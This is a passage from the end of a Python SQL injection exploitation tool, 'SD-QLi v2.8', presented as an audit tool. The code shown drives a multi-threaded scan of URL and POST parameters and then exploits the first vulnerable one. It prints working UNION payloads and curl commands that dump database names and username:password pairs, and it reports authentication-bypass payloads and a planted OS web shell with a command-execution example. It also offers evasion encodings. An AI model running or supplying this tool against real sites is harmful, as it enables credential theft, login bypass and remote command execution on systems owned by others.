                        print(f" {Colors.GREEN}[+]{Colors.END} OS Shell created: {Colors.CYAN}{check_url}{Colors.END}")
                    break
            except: pass
        
        current_params[param_name] = original_val

    def run(self):
        self._print_banner()
        print(f"[*] Target: {Colors.CYAN}{self.url}{Colors.END}")
        print(f"[*] Method: {Colors.YELLOW}{self.method}{Colors.END}")
        print("-" * 70)
        
        # Parse parameters
        params = {}
        if self.method == 'GET':
            parsed_url = urllib.parse.urlparse(self.url)
            params = dict(urllib.parse.parse_qsl(parsed_url.query, keep_blank_values=True))
            self.url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        else:
            if isinstance(self.data, str):
                params = dict(urllib.parse.parse_qsl(self.data, keep_blank_values=True))
            elif isinstance(self.data, dict):
                params = self.data
        
        if not params:
            print(f"{Colors.RED}[!] No parameters found to scan.{Colors.END}")
            return

        # Check for Login Bypass first if method is POST
        self.check_login_bypass(params.copy())

        print(f"[*] Phase 1: Scanning {len(params)} parameters...")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            for p in params:
                executor.submit(self.scan_parameter, p, params.copy())

        if not self.results['vulnerabilities']:
            print(f"\n{Colors.RED}[-] No obvious SQLi found.{Colors.END}")
        else:
            # Phase 2: Exploitation on the first vulnerable parameter found
            vuln_param = self.results['vulnerabilities'][0]['param']
            print(f"\n[*] Phase 2: Starting exploitation on {Colors.CYAN}{vuln_param}{Colors.END}")
            self.find_union_columns(vuln_param, params.copy())
            self.display_summary()

    def display_summary(self):
        print("\n" + "="*70)
        print(f"{Colors.BOLD}EXPLOITATION SUMMARY{Colors.END}")
        print("="*70)
        
        if self.results['vulnerabilities']:
            print(f"\n{Colors.GREEN}[+] SQLi VULNERABILITIES FOUND:{Colors.END}")
            for v in self.results['vulnerabilities']:
                print(f"  - Parameter: {Colors.CYAN}{v['param']}{Colors.END}")
                print(f"    Payload:   {Colors.YELLOW}{v['payload']}{Colors.END}")
                if self.method == 'GET':
                    print(f"    URL:       {v.get('url', self.url)}")

        if 'union_info' in self.results:
            u = self.results['union_info']
            print(f"\n{Colors.GREEN}[+] DATA EXFILTRATION (Global Harvest):{Colors.END}")
            if self.results['database']:
                print(f"  - Current DB:   {Colors.CYAN}{self.results['database']}{Colors.END}")
                print(f"  - Current User: {Colors.CYAN}{self.results['user']}{Colors.END}")
            print(f"  - Columns Found: {u['count']} (Reflected: {u['reflected']})")
            if self.results['databases']:
                print(f"  - Databases: {Colors.BOLD}{', '.join(self.results['databases'])}{Colors.END}")
            if self.results['tables']:
                print(f"  - High-Value Tables Processed: {Colors.CYAN}{', '.join(self.results['tables'])}{Colors.END}")
            print(f"  - Extraction Method: Sequential {Colors.BOLD}UNION-based{Colors.END} Exfiltration.")
        
        if self.results['os_shell']:
            print(f"\n{Colors.GREEN}[+] CREATED OS SHELLS:{Colors.END}")
            print(f"  - {Colors.CYAN}{self.results['shell_url']}{Colors.END}")
            print(f"    {Colors.YELLOW}Usage Example:{Colors.END} {self.results['shell_url']}?cmd=whoami")

        if self.results['login_bypass']:
            print(f"\n{Colors.GREEN}[+] AUTHENTICATION BYPASS:{Colors.END}")
            print(f"  - Working Payload: {Colors.YELLOW}{self.results['bypass_payload']}{Colors.END}")

        if 'union_info' in self.results:
            u = self.results['union_info']
            print(f"\n{Colors.YELLOW}[*] Data Exfiltration (Manual Audit){Colors.END}")
            # 1. Database enumeration proof
            mk = "SD_DBS"
            tcols = [f"'{i}'" for i in range(1, u['count'] + 1)]
            tcols[u['reflected'][0]-1] = f"CONCAT('{mk}',(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'{mk}')"
            ex_payload = f"99999' UNION SELECT {','.join(tcols)}-- -"
            
            if self.method == 'GET':
                print(f"  Fetch DBs: {self.url}?{u['param']}={urllib.parse.quote(ex_payload)}")
            else:
                print(f"  Fetch DBs: curl -X POST -d \"{u['param']}={ex_payload}\" {self.url}")
            
            # 2. Table Dump proof (Actionable)
            target = self.results['tables'][-1] if self.results['tables'] else "users.UserDetails"
            print(f"  Dump Table ({Colors.CYAN}{target}{Colors.END}):")
            
            mk2 = "SD_DUMP"
            tcols2 = [f"'{i}'" for i in range(1, u['count'] + 1)]
            # We assume 'username' and 'password' might exist as common audit targets
            qbody = f"(SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM {target})"
            tcols2[u['reflected'][0]-1] = f"CONCAT('{mk2}',{qbody},'{mk2}')"
            d_payload = f"99999' UNION SELECT {','.join(tcols2)}-- -"
            
            if self.method == 'GET':
                print(f"    URL:  {self.url}?{u['param']}={urllib.parse.quote(d_payload)}")
            else:
                print(f"    cURL: curl -X POST -d \"{u['param']}={d_payload}\" {self.url}")

        if self.results['login_bypass']:
            print(f"\n{Colors.YELLOW}[*] Login Bypass{Colors.END}")
            print(f"  Manual:  Inject {self.results['bypass_payload']} into form fields.")
        print("="*70)

def main():
    parser = argparse.ArgumentParser(description='SD-QLi v2.8 - Audit Finalizer')
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP Method')
    parser.add_argument('-d', '--data', help='POST data (e.g. "id=1&user=admin")')
    parser.add_argument('-r', '--request', help='Raw request file (Burp-style)')
    parser.add_argument('-w', '--workers', type=int, default=10, help='Number of threads')
    parser.add_argument('-t', '--timeout', type=int, default=3, help='Request timeout')
    parser.add_argument('--header', action='append', help='Custom headers')
    parser.add_argument('-e', '--encode', choices=['none', 'url', 'double', 'unicode', 'all'], default='none', help='Evasion encoding')
    
    # Enumeration Flags (v2.3)
    parser.add_argument('--dbs', action='store_true', help='Enumerate databases')
    parser.add_argument('--tables', action='store_true', help='Enumerate tables')
    parser.add_argument('--columns', action='store_true', help='Enumerate columns')
    parser.add_argument('--dump', action='store_true', help='Dump table entries')
    parser.add_argument('-D', dest='db', help='Database to enumerate')
    parser.add_argument('-T', dest='table', help='Table to enumerate')
    parser.add_argument('-C', dest='col', help='Columns to enumerate (comma-sep)')
    
    global args
    args = parser.parse_args()
    
    headers = None
    url = args.url
    method = args.method
    data = args.data
    
    if args.request:
        print(f"[*] Parsing request file: {Colors.CYAN}{args.request}{Colors.END}")
        req_info = SDQLi.parse_request_file(args.request)
        if req_info:
            url = req_info['url']
            method = req_info['method']
            data = req_info['data']
            headers = req_info['headers']
        else:
            sys.exit(1)
            
    if not url:
        parser.print_help()
        sys.exit(1)
    
    scanner = SDQLi(url, method=method, data=data, headers=headers, workers=args.workers, timeout=args.timeout)
    try:
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted by user.{Colors.END}")

if __name__ == "__main__":
    main()
